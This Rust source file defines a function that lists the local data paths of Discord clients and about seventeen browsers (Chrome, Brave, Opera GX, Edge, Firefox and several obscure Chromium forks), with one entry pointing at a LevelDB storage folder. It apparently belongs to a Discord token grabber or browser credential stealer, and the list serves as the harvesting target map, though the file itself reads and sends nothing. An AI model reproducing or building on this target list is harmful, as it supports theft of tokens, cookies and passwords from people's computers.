use std::{env, path::PathBuf};

use super::types::AppInfo;

pub fn get_paths() -> Vec<AppInfo> {
    let local = env::var("LOCALAPPDATA").unwrap_or_default();
    let roaming = env::var("APPDATA").unwrap_or_default();

    vec![
        AppInfo {
            name: "Discord",
            path: PathBuf::from(&roaming).join("Discord"),
        },
        AppInfo {
            name: "Discord Canary",
            path: PathBuf::from(&roaming).join("discordcanary"),
        },
        AppInfo {
            name: "Discord PTB",
            path: PathBuf::from(&roaming).join("discordptb"),
        },
        AppInfo {
            name: "Google Chrome",
            path: PathBuf::from(&local).join("Google\\Chrome\\User Data\\Default"),
        },
        AppInfo {
            name: "Opera",
            path: PathBuf::from(&roaming).join("Opera Software\\Opera Stable"),
        },
        AppInfo {
            name: "Brave",
            path: PathBuf::from(&local).join("BraveSoftware\\Brave-Browser\\User Data\\Default"),
        },
        AppInfo {
            name: "Yandex",
            path: PathBuf::from(&local).join("Yandex\\YandexBrowser\\User Data\\Default"),
        },
        AppInfo {
            name: "Lightcord",
            path: PathBuf::from(&roaming).join("Lightcord"),
        },
        AppInfo {
            name: "Opera GX",
            path: PathBuf::from(&roaming).join("Opera Software\\Opera GX Stable"),
        },
        AppInfo {
            name: "Amigo",
            path: PathBuf::from(&local).join("Amigo\\User Data"),
        },
        AppInfo {
            name: "Torch",
            path: PathBuf::from(&local).join("Torch\\User Data"),
        },
        AppInfo {
            name: "Kometa",
            path: PathBuf::from(&local).join("Kometa\\User Data"),
        },
        AppInfo {
            name: "Orbitum",
            path: PathBuf::from(&local).join("Orbitum\\User Data"),
        },
        AppInfo {
            name: "CentBrowser",
            path: PathBuf::from(&local).join("CentBrowser\\User Data"),
        },
        AppInfo {
            name: "Sputnik",
            path: PathBuf::from(&local).join("Sputnik\\Sputnik\\User Data"),
        },
        AppInfo {
            name: "Chrome SxS",
            path: PathBuf::from(&local).join("Google\\Chrome SxS\\User Data"),
        },
        AppInfo {
            name: "Epic Privacy Browser",
            path: PathBuf::from(&local).join("Epic Privacy Browser\\User Data"),
        },
        AppInfo {
            name: "Microsoft Edge",
            path: PathBuf::from(&local).join("Microsoft\\Edge\\User Data\\Default"),
        },
        AppInfo {
            name: "Uran",
            path: PathBuf::from(&local).join("uCozMedia\\Uran\\User Data\\Default"),
        },
        AppInfo {
            name: "Iridium",
            path: PathBuf::from(&local).join("Iridium\\User Data\\Default\\local Storage\\leveld"),
        },
        AppInfo {
            name: "Firefox",
            path: PathBuf::from(&roaming).join("Mozilla\\Firefox\\Profiles"),
        },
    ]
}
